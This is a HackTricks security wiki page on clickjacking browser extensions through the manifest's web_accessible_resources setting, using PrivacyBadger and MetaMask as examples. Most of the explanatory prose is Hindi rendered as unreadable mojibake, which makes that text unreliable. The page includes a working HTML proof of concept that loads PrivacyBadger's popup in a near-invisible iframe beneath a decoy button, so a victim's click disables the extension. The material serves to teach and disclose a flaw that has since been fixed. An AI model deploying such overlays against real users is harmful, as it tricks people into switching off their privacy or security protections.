# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

рдпрд╣ рдкреГрд╖реНрда рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ ClickJacking рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИред\
рдпрджрд┐ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ ClickJacking рдХреНрдпрд╛ рд╣реИ, рддреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдлрд╝рд╛рдЗрд▓ **`manifest.json`** рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрд╕ JSON рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдлрд╝реАрд▓реНрдб `web_accessible_resources` рд╣реЛрддреА рд╣реИред рдпрд╣рд╛рдБ [Chrome рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) рдореЗрдВ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛ рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ:

> рдпреЗ рд╕рдВрд╕рд╛рдзрди рдлрд┐рд░ рдПрдХ рд╡реЗрдмрдкреГрд╖реНрда рдореЗрдВ URL **`chrome-extension://[PACKAGE ID]/[PATH]`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗ, рдЬрд┐рд╕реЗ **`extension.getURL method`** рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╕рдВрд╕рд╛рдзрди рдЙрдЪрд┐рдд CORS рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдкрд░реЛрд╕реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╡реЗ XHR рдЬреИрд╕реЗ рддрдВрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ **`web_accessible_resources`** рдХреЗрд╡рд▓ рд╡реЗрдм рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реЛрддреЗ; рд╡реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖рдорддрд╛рдПрдБ рд╣реИрдВ:

* рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рд╕реНрдерд┐рддрд┐ рдмрджрд▓рдирд╛
* рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдирд╛
* рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рд╣рдж рддрдХ рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдирд╛

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреА рд╣реИред рдпрджрд┐ **`web_accessible_resources`** рдХреЗ рднреАрддрд░ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЗрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдирдЬрд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдЗрд╕ рдПрдореНрдмреЗрдбреЗрдб рд╕рдВрд╕рд╛рдзрди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдРрд╕реА рд╕рдХреНрд░рд┐рдпрддрд╛ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдкрд░рд┐рдгрд╛рдореЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддреА рд╣реИ, рдЬреЛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ рдХреНрд╖рдорддрд╛рдУрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИред

## PrivacyBadger Example

рдПрдХреНрд╕рдЯреЗрдВрд╢рди PrivacyBadger рдореЗрдВ, `skin/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ `web_accessible_resources` рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЧрдИ рдереА (рдореВрд▓ [рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://blog.lizzie.io/clickjacking-privacy-badger.html) рджреЗрдЦреЗрдВ):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рдХреА рдУрд░ рд▓реЗ рдЧрдпрд╛ред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, `skin/popup.html` рдлрд╝рд╛рдЗрд▓, рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ PrivacyBadger рдЖрдЗрдХрди рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрд╢рди рдкрд░ рд░реЗрдВрдбрд░ рд╣реЛрддреА рд╣реИ, рдХреЛ рдПрдХ `iframe` рдХреЗ рднреАрддрд░ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдПрдореНрдмреЗрдбрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ "Disable PrivacyBadger for this Website" рдкрд░ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЧреЛрдкрдиреАрдпрддрд╛ рд╕реЗ рд╕рдордЭреМрддрд╛ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ PrivacyBadger рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдврд╝реА рд╣реБрдИ рдЯреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рдЕрдзреАрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдПрдХ рджреГрд╢реНрдп рдкреНрд░рджрд░реНрд╢рди [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) рдкрд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП ClickJacking рд╡реАрдбрд┐рдпреЛ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реАрдзрд╛ рд╕рдорд╛рдзрд╛рди рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛: `web_accessible_resources` рдХреА рд╕реВрдЪреА рд╕реЗ `/skin/*` рдХреЛ рд╣рдЯрд╛рдирд╛ред рдЗрд╕ рдкрд░рд┐рд╡рд░реНрддрди рдиреЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдХрдо рдХрд░ рджрд┐рдпрд╛ рдХрд┐ `skin/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╡реЗрдм-рдПрдХреНрд╕реЗрд╕рд┐рдмрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдпрд╛ рд╣реЗрд░рдлреЗрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред

рдлрд┐рдХреНрд╕ рдЖрд╕рд╛рди рдерд╛: **`web_accessible_resources` рд╕реЗ `/skin/*` рд╣рдЯрд╛рдПрдВ**ред

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Example

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Metamask рдиреЗ рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЛ рдареАрдХ рдХрд┐рдпрд╛ рдЬрдм рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдЧрдпрд╛ рдХрд┐ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ **`https:`** рдпрд╛ **`http:`** рдерд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`chrome:`** рдирд╣реАрдВ):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Metamask рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдПрдХ рдФрд░ ClickJacking рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдерд╛ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Click to whitelist** рдХрд░ рд╕рдХрддреЗ рдереЗ рдЬрдм рдПрдХ рдкреГрд╖реНрда рдХреЛ рдлрд╝рд┐рд╢рд┐рдВрдЧ рд╣реЛрдиреЗ рдХрд╛ рд╕рдВрджреЗрд╣ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ `тАЬweb_accessible_resourcesтАЭ: [тАЬinpage.jsтАЭ, тАЬphishing.htmlтАЭ]`ред рдЪреВрдВрдХрд┐ рд╡рд╣ рдкреГрд╖реНрда Clickjacking рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдерд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рджрд┐рдЦрд╛рдХрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ рдЗрд╕реЗ рдмрд┐рдирд╛ рдиреЛрдЯрд┐рд╕ рдХрд┐рдП рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдФрд░ рдлрд┐рд░ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдкреГрд╖реНрда рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

## Steam Inventory Helper Example

Check the following page to check how a **XSS** in a browser extension was chained with a **ClickJacking** vulnerability:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## References

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
